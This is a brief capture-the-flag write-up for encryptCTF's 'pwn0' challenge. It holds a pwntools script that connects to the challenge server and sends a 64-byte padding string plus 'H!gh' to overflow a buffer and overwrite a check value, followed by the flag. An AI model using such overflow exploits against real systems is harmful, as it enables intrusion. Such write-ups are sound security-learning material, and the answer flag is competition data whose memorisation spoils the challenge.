# **pwn0**

#### tag : pwn

-----------------------------------------------

#### Description

>How's the josh?
>
>nc 104.154.106.182 1234
>
>author: codacker

-----------------------------------------------

#### Solution

```python
from pwn import *

r = remote('104.154.106.182', 1234)

r.recvuntil('?\n')
r.sendline('a' * 0x40 + 'H!gh')
r.interactive()
```
**encryptCTF{L3t5_R4!53_7h3_J05H}**
